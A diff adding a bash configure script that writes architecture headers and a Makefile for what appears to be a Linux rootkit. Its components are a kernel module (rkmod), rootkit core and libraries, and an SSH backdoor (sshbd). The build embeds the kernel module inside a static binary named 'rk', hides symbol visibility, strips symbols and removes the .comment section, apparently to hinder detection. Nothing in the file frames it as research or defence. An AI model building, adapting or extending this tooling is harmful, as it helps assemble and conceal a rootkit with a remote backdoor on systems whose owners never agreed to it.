@@ -1,0 +1,103 @@
+#!/bin/bash
+
+while [ $# -ne 0 ]; do
+
+case "$1" in
+--arch*)
+shift
+if [ $1 == "amd64" ]
+then
+	ARCH="__AMD64__"
+elif [ $1 == "i386" ]
+then
+	ARCH="__IA32__"
+elif [ $1 == "mips32" ]
+then
+	ARCH="__MIPS32__"
+elif [ $1 == "mips64" ]
+then
+	ARCH="__MIPS64__"
+fi
+;;
+esac;
+shift
+done
+
+echo "#ifndef __INCS_H__"   >  include/arch.h
+echo "#define __INCS_H__"   >> include/arch.h
+echo ""                     >> include/arch.h
+
+echo "#define $ARCH 1"      >> include/arch.h
+echo "#define $ARCH 1"      >> sshbd/arch.h
+echo ""                     >> include/arch.h
+
+echo "#ifdef __AMD64__"     >> include/arch.h
+echo "#include <x64.h>"     >> include/arch.h
+echo "#include <x86.h>"     >> include/arch.h
+echo "#endif"               >> include/arch.h
+echo ""                     >> include/arch.h
+
+echo "#ifdef __IA32__"      >> include/arch.h
+echo "#include <x32.h>"     >> include/arch.h
+echo "#include <x86.h>"     >> include/arch.h
+echo "#endif"               >> include/arch.h
+echo ""                     >> include/arch.h
+
+echo "#ifdef __MIPS32__"    >> include/arch.h
+echo "#include <mips.h>"    >> include/arch.h
+echo "#endif"               >> include/arch.h
+echo ""                     >> include/arch.h
+
+echo "#ifdef __MIPS64__"    >> include/arch.h
+echo "#include <mips.h>"    >> include/arch.h
+echo "#endif"               >> include/arch.h
+echo ""                     >> include/arch.h
+
+echo "#endif"               >> include/arch.h
+
+cat << EOF > Makefile
+ARCH=$ARCH
+ifeq (\$(ARCH), __MIPS32__)
+KFLAGS=-S -fomit-frame-pointer -G 0 -fpic -fvisibility=hidden -finhibit-size-directive
+UFLAGS=-mno-abicalls
+MFLAGS=-mips32
+endif
+ifeq (\$(ARCH), __AMD64__)
+KFLAGS=-S -fvisibility=protected -fPIC
+MFLAGS=-m64
+UFLAGS=
+endif
+ifeq (\$(ARCH), __IA32__)
+KFLAGS=-S
+MFLAGS=
+UFLAGS=
+endif
+export KFLAGS
+export MFLAGS
+export UFLAGS
+CC=gcc
+CFLAGS=-s -fno-builtin -nostdlib -nodefaultlibs
+LDFLAGS=-static
+OBJ=rkmod/kmodd.o rkcore/rkcore.o rkcore/rkopsig.o rkcore/rklib.o rkcore/rkdbg.o rkbin/*.o rklib/*.o sshbd/bd.o
+all:
+	@make clean
+	@cd rkmod && make
+	@ld -r -b binary -o rkmod/kmodd.o rkmod/kmodd.ko
+	@objcopy --redefine-sym _binary_rkmod_kmodd_ko_size=_rkmod_size rkmod/kmodd.o
+	@objcopy --redefine-sym _binary_rkmod_kmodd_ko_start=_rkmod_start rkmod/kmodd.o
+	@cd rkbin  && make
+	@cd sshbd  && make
+	@cd rklib  && make
+	@cd rkcore && make
+	\$(CC) \$(LDFLAGS) \$(CFLAGS) \$(OBJ) -o rk
+	@objcopy --remove-section=.comment rk
+clean:
+	@rm -rf *~
+	@rm -rf rk
+	@cd rkbin  && make clean
+	@cd sshbd  && make clean
+	@cd rklib  && make clean
+	@cd rkmod  && make clean
+	@cd rkcore && make clean
+
+EOF
